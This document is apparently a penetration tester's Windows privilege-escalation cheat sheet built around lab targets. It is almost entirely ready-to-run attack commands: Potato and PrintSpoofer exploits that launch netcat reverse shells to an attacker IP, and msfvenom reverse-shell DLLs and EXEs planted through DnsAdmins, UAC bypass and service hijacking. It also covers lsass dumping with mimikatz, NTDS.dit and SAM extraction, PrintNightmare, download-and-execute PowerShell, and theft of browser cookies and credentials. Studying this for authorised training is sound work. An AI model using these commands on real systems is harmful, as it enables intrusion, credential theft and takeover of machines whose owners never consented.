# Change users password
```
net user administrator password
```
#  SeImpersonate
```
xp_cmdshell whoami /priv
```
### Example
```
PRIVILEGES INFORMATION                                                             

----------------------                                                             

NULL                                                                               

Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    

SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    

SeImpersonatePrivilege        Impersonate a client after authentication Enabled    

SeCreateGlobalPrivilege       Create global objects                     Enabled    

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled 
```
To escalate privileges using these rights, let's first download the exploit binary and upload this and nc.exe to the target server. Next, stand up a Netcat listener on port 8443, and execute the command below where -l is the COM server listening port, -p is the program to launch (cmd.exe), -a is the argument passed to cmd.exe, and -t is the createprocess call. Below, we are telling the tool to try both the CreateProcessWithTokenW and CreateProcessAsUser functions, which need SeImpersonate or SeAssignPrimaryToken privileges respectively.
## JuicyPotato
https://github.com/ohpe/juicy-potato

```
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.214 8443 -e cmd.exe" -t *
```
JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. 
## PrintSpoofer
https://github.com/itm4n/PrintSpoofer

https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
```
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.214 8443 -e cmd"
```
## Rogue Potato
https://github.com/antonioCoco/RoguePotato
```
xp_cmdshell c:\tools\RoguePotato\RoguePotato.exe -r 10.10.14.214 -e "c:\tools\nc.exe 10.10.14.214 8443 -e cmd"
```
# SeDebugPrivilege
Verify permissions in cmd with admin
```
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
## Procdump
```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
or

![image](https://user-images.githubusercontent.com/128841823/232630604-454078d5-aa14-4f0b-8843-c3b1b1bd163e.png)

transfer or direct mimikats to the lsass.dmp

## Mimikats
```
mimikatz.exe
```
```
mimikatz # log
```
```
sekurlsa::minidump lsass.dmp
```
```
sekurlsa::logonpasswords
```
also

https://decoder.cloud/2018/02/02/getting-system/

# SeTakeOwnershipPrivilege
This privilege assigns WRITE_OWNER rights over an object
### Example of privs
```
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```
```
import-module .\EnableAllTokenPrivs.ps1
```
```
.\EnableAllTokenPrivs.ps1
```
```
PS C:\tools> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```
### Choosing a target file
```
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```
### Checking File Ownership
```
cmd /c dir /q 'C:\Department Shares\Private\IT'
```
### Taking Ownership of the File
```
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```
### Verify Ownership
```
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```
### Grant user full privileges over the target file
```
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```
### Viewing the file
```
cat 'C:\Department Shares\Private\IT\cred.txt'
```
### Files of interest
```
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```
# Windows Built-in Groups
Default groups

https://ss64.com/nt/syntax-security_groups.html
```
whoami /priv
```
Import the modules
```
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
Verify privs
```
whoami /priv
```
```
Copy-FileSeBackupPrivilege 'c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' .\flag.txt
```
```
cat .\flag.txt
```
## Copying NTDS.dit
```
diskshadow.exe
```
```
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```
```
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\tools\dump\ntds.dit
```
## Backing up SAM and SYSTEM Registry Hives
The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's secretsdump.py

run cmd.exe as admin
```
reg save HKLM\SYSTEM SYSTEM.SAV
```
```
reg save HKLM\SAM SAM.SAV
```
It's worth noting that if a folder or file has an explicit deny entry for our current user or a group they belong to, this will prevent us from accessing it, even if the FILE_FLAG_BACKUP_SEMANTICS flag is specified.
## Extracting Credentials from NTDS.dit
```
Import-Module .\DSInternals.psd1
```
```
$key = Get-BootKey -SystemHivePath .\SYSTEM
```
```
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```
or transfer the 
files we dumped to the attack box and run secretsdump
```
impacket-secretsdump local -system SYSTEM -ntds ntds.dit
```
## Using Robocopy to transfer files
```
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```
# Event Log Readers
## Confirming Group Membership
```
net localgroup "Event Log Readers"
```
## Searching Security Logs using webtutil
```
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```
## Passing Credientials to wevtutil
```
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```
## Searching Security Logs Using Get-WinEvent
```
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
The cmdlet can also be run as another user with the -Credential parameter.
# DNS Admins
## Leveraging DnsAdmins Access
```
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```
```
sudo python3 -m http.server 7777
```
From clients powershell
```
wget "http://10.10.14.214:7777/adduser.dll" -outfile "adduser.dll"
```
From clients CMD
```
dnscmd.exe /config /serverlevelplugindll C:\tools\adduser.dll
```
if denied execute this in powershell
```
Get-ADGroupMember -Identity DnsAdmins
```
### Finding Users SID
```
wmic useraccount where name="netadm" get sid
```
### Checking Permissions on DNS Service
```
sc.exe sdshow DNS
```
### Stop and Start DNS Services
```
sc stop dns
sc start dns
```

### Confirming Group Membership
```
net group "Domain Admins" /dom
```
https://medium.com/@parvezahmad90/windows-privilege-escalation-dns-admin-to-nt-authority-system-step-by-step-945fe2a094dc

For a reverseshell use this payload
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.214 LPORT=4444 --platform windows -f dll > netsec.dll
```
## Mimilib
http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html

## Creating a WPAD Record
```
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```
```
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```
Then use inveigh or responder

# Print Operators Group
Run CMD as Admin
### Required tools
```
EnableSeLoadDriverPrivilege.cpp
Capcom.sys driver 
```
## Add Reference to Drive
```
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
```
```
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```
## Verify the driver is not loaded
```
.\DriverView.exe /stext drivers.txt
```
```
cat drivers.txt | Select-String -pattern Capcom
```
## Verify Privledge is enabled
```
EnableSeLoadDriverPrivilege.exe
```
## Verify the driver
```
.\DriverView.exe /stext drivers.txt
```
```
cat drivers.txt | Select-String -pattern Capcom
```
## Used ExploitCapcom Tool to escalate privileges
```
.\ExploitCapcom.exe
```
## Automating the Steps with EoPLoadDriver.exe
```
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```
## Used ExploitCapcom Tool to escalate privileges
```
.\ExploitCapcom.exe
```
# Server Operations Group
### Querying the AppReadiness Service
```
sc qc AppReadiness
```
### PsService.exe
```
PsService.exe security AppReadiness
```
This confirms that the Server Operators group has SERVICE_ALL_ACCESS access right, which gives us full control over this service.
### Check for local admins
```
net localgroup Administrators
```
### Modifying the Service Binary Path
```
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```
### Starting the Service
```
sc start AppReadiness
```
### Confirming the Local Admin Group Membership
```
net localgroup Administrators
```
You should see server_adm added to the group this time
### Crackmap Exec 
```
crackmapexec smb 10.129.43.42 -u server_adm -p 'HTB_@cademy_stdnt!'
```
### Secretsdump to retrieve NTLM hashes
```
impacket-secretsdump server_adm@10.129.43.42 -just-dc-user administrator
```
Crack the Hash or PTH
### Hashcat
```
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
```
### PSexec
```
impacket-psexec administrator@10.129.43.42 -hashes :7796ee39fd3a9c3a1844556115ae1a54
```
# User Account Control
### Verify Current User
```
whoami /user
```
### Confirming Admin Group Membership
```
net localgroup administrators
```
### Reviewing User Privileges
```
net localgroup administrators
```
### Confirming UAC is enabled
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```
### Check UAC Level
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```
### In Powershell check Windows Version
```
[environment]::OSVersion.Version
```
Verify windows version to release

https://en.wikipedia.org/wiki/Windows_10_version_history

https://egre55.github.io/system-properties-uac-bypass/
### Path Variable
```
cmd /c echo %PATH%
```
### Create Payload
```
msfvenom-p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```
### Start HTTP Server
```
sudo python3 -m http.server 8080
```
### Download payload
```
curl http://10.10.14.214:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```
### Start Listener
```
nc -lvnp 8443
```
### Execute in CMD on host
```
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```
### Run payload in CMD
```
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```
Then go back to your listener to verify that you caught the shell
# Permissive File System ACLs
### Sharpup
```
.\SharpUp.exe audit
```
### ICAL to verify what groups/users have permissions
```
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```
### Create payload
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.214 LPORT=4444 --platform windows -f exe > SecurityService.exe
```
### NC Listener
```
nc -lvnp 4444
```
### execute payload
```
sc start SecurityService
```
# Weak Service Permissions
### SharUP
```
SharpUp.exe audit
```
Checking Permissions with AccessChk (change WindscribeService to what is found)
```
accesschk.exe /accepteula -quvcw WindscribeService
```
### Review Local Group Admin
```
net localgroup administrators
```
### Changing the Service Binary Path
```
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```
### Stopping the Service
```
sc stop WindscribeService
```
### Starting the Service
```
sc start WindscribeService
```
### Verify Permissions
```
net localgroup administrators
```
log off and log back in to complete the permissions
## Search for Unquoted Service Paths
```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```
## Check start up programs
```
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```
### Other refrences 
https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2

https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
# Kernal Exploits
### Checking Permissions on the SAM file
```
icacls c:\Windows\System32\config\SAM
```
### CVE-2021-36934.exe
```
 .\CVE-2021-36934.exe
 ```
### Spooler Service 
```
ls \\localhost\pipe\spoolss
```
![image](https://user-images.githubusercontent.com/128841823/233182366-77276325-9498-47bf-94d0-a7840b9f34bd.png)
### Adding Local Admin with PrintNightmare Powershell POC
```
Set-ExecutionPolicy Bypass -Scope Process
```
### Import the script
```
Import-Module .\CVE-2021-1675.ps1
```
```
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```
### Test
```
net user hacker
```
### Enumerating Missing Patches
```
PS C:\htb> systeminfo
PS C:\htb> wmic qfe list brief
PS C:\htb> Get-Hotfix
```
We can search for each KB (Microsoft Knowledge Base ID number) in the Microsoft Update Catalog to get a better idea of what fixes have been installed and how far behind the system may be on security updates. A search for KB5000808 shows us that this is an update from March of 2021, which means the system is likely far behind on security updates.
### Microsoft CVE-2020-0668: Windows Kernel Elevation of Privilege Vulnerability,

https://github.com/RedCursorSecurityConsulting/CVE-2020-0668
## Maintenanceservice.exe
### Checking Permissions of Binary
```
icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```
### Payload
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
```
### Listener
```
nc -lvnp 8443
```
### Transfer the payload (create two copys)
```
wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe
wget http://10.10.14.214:8080/maintenanceservice.exe -O maintenanceservice2.exe
```
### Execute the payload
```
C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\tools\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```
### Check permissions to the new file
```
icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```
### Replacing File with Malicious Binary
```
copy /Y C:\tools\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```
### MSFConsole
```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <our_ip>
set LPORT 8443
exploit
```
### Start the service
```
net start MozillaMaintenance 
```
 # Vulnerable Services
### Enumerating Installed Programs
```
wmic product get name
```
### Enumerating local ports
```
netstat -ano | findstr 6064
```
### Enumerating Process ID
```
get-process -Id 3324
```
### Enumerating running service
```
get-service | ? {$_.DisplayName -like 'Druva*'}
```
```
get-service | ? {$_.DisplayName -like 'VMware*'}
```
### Invoke-PowerShellTcp.ps1
Add in the information listed to the bootome of the script and rename it shell.ps1
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.214 -Port 9443
```
### druval.ps1
Modify the powershell script for Reverse Shell
```
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.214:8080/shell.ps1')"
```
### start HTTP Server
```
python3 -m http.server 8080
```
### Start listener
```
nc -lvnp 9443
```
### Modify the Powershell Execution Polciy
```
set-ExecutionPolicy Bypass -Scope Process
```
Execute the duval.ps1, I had to use Powershell ISE to get it to work properly. 

# Credential Hunting
## Findstr
```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```
Files to search for
```
web.config
unattended.xml
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
### Confirm the powershell History Location
```
(Get-PSReadLineOption).HistorySavePath
```
### Reading PS Histroy Location
```
gc (Get-PSReadLineOption).HistorySavePath
```
### View all PS Histroy that we have access too
```
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
 ```
## Chrome dictionary files
```
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```
Decrypting PowerShell Credentials
```
<?xml version="1.0"?>

-<Objs xmlns="http://schemas.microsoft.com/powershell/2004/04" Version="1.1.0.1">


-<Obj RefId="0">


-<TN RefId="0">

<T>System.Management.Automation.PSCredential</T>

<T>System.Object</T>

</TN>

<ToString>System.Management.Automation.PSCredential</ToString>


-<Props>

<S N="UserName">bob</S>

<SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb0100000016548747b77ab84f9262fa5a851d5f71000000000200000000001066000000010000200000002494ddabd3338a4fccf788171788421fefac6998b41a9c05beeb5a9a5dc39cb6000000000e8000000002000020000000736dfd85852ebbabd9d902c6450c4c51ee78f0d2e4f5c895dc1363b7178f2e0c30000000017cca90a9f8861150c51de9504bb3a3e591b85f834f8b53134f5258541fbda6ec9941ae6fa99db5e0b2e82ba0a170b04000000064b5740c7e8f2e845293abdf942e54dff0e4a563770b99e7cf9d74b6e7726143ade7ce82db92689f59291826b32098553e6b3786e3bacf4ee1af0df529b9a583</SS>

</Props>

</Obj>

</Objs>
```
```
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
```
```
$credential.GetNetworkCredential().username
```
```
$credential.GetNetworkCredential().password
```
## Connecting with PowerShell Credentials
```
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $encryptedString
```
# Other Files
```
cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
```
```
findstr /si password *.xml *.ini *.txt *.config
```
```
findstr /spin "password" *.*
```
```
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
```
```
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
```
```
where /R C:\ *.config
```
```
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```
### Sticky Notes
```
C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```
Open file in SQLite on Kali box
![image](https://user-images.githubusercontent.com/128841823/233461502-c7d5461f-5209-4f77-a198-087255149486.png)
### Opening Sticky Notes with PS
```
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A

PS C:\htb> cd .\PSSQLite\
PS C:\htb> Import-Module .\PSSQLite.psd1
PS C:\htb> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\htb> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
 
Text
----
\id=de368df0-6939-4579-8d38-0fda521c9bc4 vCenter
\id=e4adae4c-a40b-48b4-93a5-900247852f96
\id=1a44a631-6fff-4961-a4df-27898e9e1e65 root:Vc3nt3R_adm1n!
\id=c450fc5f-dc51-4412-b4ac-321fd41c522a Thycotic demo tomorrow at 10am
```
### Using Strings
```
strings plum.sqlite
```
### Other interesting files 
```
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```
## Cmdkey Saved Credentials
```
cmdkey /list
```
Attempt to use RDP 
![image](https://user-images.githubusercontent.com/128841823/233463653-3be0fd0c-25da-4ca2-9754-b5754259132b.png)
We can also attempt to reuse the credentials using runas to send ourselves a reverse shell as that user, run a binary, or launch a PowerShell or CMD console with a command such as:
```
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```
### Browser Credentials
```
.\SharpChrome.exe logins /unprotect
```
### Password Managers
```
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 
```
```
hashcat -m 13400 keepass_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### E-Mail
https://github.com/dafthack/MailSniper
### Lazange
```
.\lazagne.exe all
```
### Session Gopher
```
Import-Module .\SessionGopher.ps1
```
```
Invoke-SessionGopher -Target WINLPE-SRV01
```
### Wifi Passwords
```
netsh wlan show profile
```
```
netsh wlan show profile ilfreight_corp key=clear
```
# Interacting with Users
### Wireshark
capture traffic and then filter it with net-credy.py in tools folder
```
sudo python2 net-creds.py -i tun0
[*] Using interface: tun0
                                                                                                                                                       ❯ sudo python2 net-creds.py -p /home/p3ta/HTB/test.pcap
```
### Monitoring Processes with Powershell
```
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```
### Elevating with Docker
https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e
### Running monitor Script on target machine
```
IEX (iwr 'http://10.10.10.205/procmon.ps1')
```
### Responder
Run it from tools/responder
```
sudo ./Responder.py -wrf -v -I tun0
```
### Lnkbomb
https://github.com/dievus/lnkbomb
### Malicious SCF File
```
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```
https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/
### Hashcat captured Hashes
```
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
```
# Pillaging
## Checklist
```
Data Sources
Below are some of the sources from which we can obtain information from compromised systems:

Installed applications
Installed services
Websites
File Shares
Databases
Directory Services (such as Active Directory, Azure AD, etc.)
Name Servers
Deployment Services
Certificate Authority
Source Code Management Server
Virtualization
Messaging
Monitoring and Logging Systems
Backups
Sensitive Data
Keylogging
Screen Capture
Network Traffic Capture
Previous Audit reports
User Information
History files, interesting documents (.doc/x,.xls/x,password./pass., etc)
Roles and Privileges
Web Browsers
IM Clients
```
## Identifying Common Applications
```
dir "C:\Program Files"
```
### With Powershell
```
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
```
```
PS C:\htb> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
```
```
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```
### Enumerating program
```
ls C:\Users\julio\AppData\Roaming\mRemoteNG
```
### mRemoteNG-Decrypt
https://github.com/haseebT/mRemoteNG-Decrypt.git
```
python3 mremoteng_decrypt.py -s "IZxeG5zCN6eBuKe9Cwqy+Grk2n95KHmzC5yE3icpkyqTwRKUnchjFqziUqP+Bad69+WTLq8M2vlgrBQ="
```
### Cracking with Bashloop
```
for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBsuHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    
```
## Abusing Cookies
### Cookie Extraction from Fire Fox
```
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```
Copy the cookie to the the local file share on Kali and use the cookieextractor.py script that can be found in the github
### Strings on the cookie
```
strings cookies.sqlite
```
### Cookieextractor.py
```
python3 cookieextractor.py --dbpath cookies.sqlite --host slack --cookie d
```
Put the cookie in the cookie editor plug in and save/refresh
### Chrome Cookies
Cookie Extraction from Chromium-based Browsers
The chromium-based browser also stores its cookies information in an SQLite database. The only difference is that the cookie value is encrypted with Data Protection API (DPAPI). DPAPI is commonly used to encrypt data using information from the current user account or computer.

To get the cookie value, we'll need to perform a decryption routine from the session of the user we compromised. Thankfully, a tool SharpChromium does what we need. It connects to the current user SQLite cookie database, decrypts the cookie value, and presents the result in JSON format.
https://github.com/djhohnstein/SharpChromium

```
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```
```
Invoke-SharpChromium -Command "cookies slack.com"
```
## Clipboard
Execute the code in Powershell ISE form Invoke-Clipboard.ps1
```Invoke-ClipboardLogger
```
## Attacking Backup Servers
https://restic.net/

https://github.com/restic/restic/releases/tag/v0.15.1
### Initiallizing backup dir
```
mkdir E:\restic2; restic.exe -r E:\restic2 init
```
### Backup a directory
```
$env:RESTIC_PASSWORD = 'Password'
```
```
restic.exe -r E:\restic2\ backup C:\SampleFolder
```
### Back up a Directory with VSS
```
restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
```
### Check Backups Saved in a Repository
```
restic.exe -r E:\restic2\ snapshots
```
```
restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore
```









